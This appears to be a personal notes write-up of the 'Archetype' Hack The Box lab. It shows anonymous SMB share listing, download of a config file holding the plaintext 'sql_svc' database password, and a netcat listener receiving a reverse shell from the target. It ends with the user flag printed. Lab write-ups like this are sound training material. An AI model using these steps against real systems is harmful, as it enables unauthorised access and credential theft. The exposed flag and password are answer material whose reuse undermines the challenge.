---
publish:
tags:
  - Windows
  - Very_Easy
---
---
# Reconnaissance

nmap scan.
![[Pasted image 20260110232718.png]]

smb shares:
![[Pasted image 20260110233057.png]]

file in open share.
![[Pasted image 20260110233250.png]]
![[Pasted image 20260110233430.png]]
```bash
󰣇 offsec/htb/archetype ❯ smbclient -L \\\\10.129.28.37\\ -N                                                                                                                                                                                                                                                                                              23:30 
Can't load /etc/samba/smb.conf - run testparm to debug it

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
󰣇 offsec/htb/archetype ❯ smbclient -N \\\\10.129.28.37\\backups                                                                                                                                                                                                                                                                                          23:30 
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                5056511 blocks of size 4096. 2551879 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \> ^C
󰣇 offsec/htb/archetype ❯ cat prod.dtsConfig                                                                                                                                                                                                                                                                                                              23:32 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>%                                                                                                                                                                                                                                                                                                                                             
󰣇 offsec/htb/archetype ❯                                                                                                                                                                                                                                                                                                                                 23:32 
```






```cmd
󰣇 offsec/htb/archetype ❯ rlwrap nc -nvlp 4444                                                                                                                                                                                                                                                                                                           00:03 [0/16]
Listening on 0.0.0.0 4444                           
Connection received on 10.129.28.37 49678                                               
Microsoft Windows [Version 10.0.17763.2061]         
(c) 2018 Microsoft Corporation. All rights reserved.                                    
                                                                                        
C:\Windows\system32>whoami                                                              
whoami                         
archetype\sql_svc                                                                       
                                                                                        
C:\Windows\system32>cd C:\Users
cd C:\Users                                                                             
                                                                                        
C:\Users>dir                      
dir                                                                                     
 Volume in drive C has no label.  
 Volume Serial Number is 9565-0B4F                                                       
                                                                                        
 Directory of C:\Users                                                                  
                                                                                        
01/19/2020  03:10 PM    <DIR>          .     
01/19/2020  03:10 PM    <DIR>          ..           
01/19/2020  10:39 PM    <DIR>          Administrator
01/10/2026  02:58 PM    <DIR>          Public     
01/20/2020  05:01 AM    <DIR>          sql_svc                                          
               0 File(s)              0 bytes     
               5 Dir(s)  10,723,614,720 bytes free                                      
                                                                                                                                                    
C:\Users>dir sql_svc              
dir sql_svc                                                                             
 Volume in drive C has no label.  
 Volume Serial Number is 9565-0B4F                                                       
                                                                                        
 Directory of C:\Users\sql_svc                                                          
                                                                                        
01/20/2020  05:01 AM    <DIR>          .       
01/20/2020  05:01 AM    <DIR>          ..        
01/20/2020  05:01 AM    <DIR>          3D Objects
01/20/2020  05:01 AM    <DIR>          Contacts 
01/20/2020  05:42 AM    <DIR>          Desktop  
01/20/2020  05:01 AM    <DIR>          Documents
01/20/2020  05:01 AM    <DIR>          Downloads
01/20/2020  05:01 AM    <DIR>          Favorites
01/20/2020  05:01 AM    <DIR>          Links      
01/20/2020  05:01 AM    <DIR>          Music   
01/20/2020  05:01 AM    <DIR>          Pictures   
01/20/2020  05:01 AM    <DIR>          Saved Games
01/20/2020  05:01 AM    <DIR>          Searches   
01/20/2020  05:01 AM    <DIR>          Videos                                           
               0 File(s)              0 bytes     
              14 Dir(s)  10,723,614,720 bytes free                                      
                                                                            
                                                                            
C:\Users>dir sql_svc\Desktop      
dir sql_svc\Desktop                                                                     
 Volume in drive C has no label.      
 Volume Serial Number is 9565-0B4F                                                       
                                                                                        
 Directory of C:\Users\sql_svc\Desktop                                                  
                                                                                        
01/20/2020  05:42 AM    <DIR>          .     
01/20/2020  05:42 AM    <DIR>          ..         
02/25/2020  06:37 AM                32 user.txt                                         
               1 File(s)             32 bytes     
               2 Dir(s)  10,723,614,720 bytes free                                      
                                                                                        
C:\Users>type sql_svc\Desktop\user.txt
type sql_svc\Desktop\user.txt                                                            
3e7b102e78218e935bf3f4951fec21a3         
```


![[Pasted image 20260111003807.png]]